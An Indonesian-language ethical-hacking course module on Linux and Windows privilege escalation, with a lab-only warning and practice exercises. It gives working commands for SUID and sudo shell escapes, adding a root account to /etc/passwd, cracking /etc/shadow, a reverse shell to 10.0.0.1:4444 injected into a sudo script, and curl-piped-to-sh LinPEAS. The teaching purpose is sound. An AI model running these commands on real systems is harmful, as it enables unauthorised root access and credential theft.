---
title: "Privilege Escalation"
track: keamanan-siber
module: 05-ethical-hacking
order: 2
level: advanced
duration: 50
tags: [privilege-escalation, linux, windows, suid, sudo]
author: sandikodev
updated: 2026-04-17
---

# Privilege Escalation

Setelah mendapat initial access sebagai user biasa, privilege escalation adalah proses mendapatkan akses root/admin.

> ⚠️ Hanya praktikkan di lab/CTF/sistem dengan izin eksplisit.

## Linux Privilege Escalation

### Checklist Awal

```bash
# Siapa kita?
id && whoami

# Sudo permissions
sudo -l

# SUID binaries — berjalan sebagai owner (root)
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Services yang berjalan
ps aux | grep root
ss -tulpn

# Environment variables
env | grep -i pass
```

### SUID Exploitation

```bash
# Cek di GTFOBins: https://gtfobins.github.io
# Contoh: /usr/bin/find dengan SUID root

find . -exec /bin/bash -p \; -quit
# -p = privileged mode (pertahankan SUID)

# Contoh: /usr/bin/python3 dengan SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Sudo Exploitation

```bash
# Jika user bisa sudo python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# Jika bisa sudo vi/vim
sudo vi
:!bash

# Sudo tanpa password untuk script tertentu
# /etc/sudoers: user ALL=(root) NOPASSWD: /opt/backup.sh
# Jika backup.sh writable:
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /opt/backup.sh
sudo /opt/backup.sh
```

### Weak File Permissions

```bash
# /etc/passwd writable
echo "hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker  # Login sebagai root!

# /etc/shadow readable
cat /etc/shadow
# Crack dengan hashcat:
hashcat -m 1800 hash.txt rockyou.txt
```

### LinPEAS — Automated Enumeration

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee linpeas_output.txt

# Lihat hasil — fokus pada warna merah/kuning
grep -E "^\[+\!|^\[+\?" linpeas_output.txt
```

## Windows Privilege Escalation

```powershell
# Siapa kita?
whoami /all

# Unquoted service path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Lab Practice

```bash
# Download VMs dari VulnHub
# Recommended untuk belajar privesc:
# - Basic Pentesting 1 & 2
# - Mr. Robot
# - Kioptrix series

# Atau gunakan TryHackMe/HTB rooms:
# - Linux PrivEsc
# - Windows PrivEsc
```

## Latihan

1. Setup VM Metasploitable2
2. Dapatkan shell sebagai user biasa via exploit
3. Gunakan LinPEAS untuk enumeration
4. Escalate ke root menggunakan SUID atau sudo misconfiguration
5. Tulis laporan: temuan + bukti + rekomendasi fix
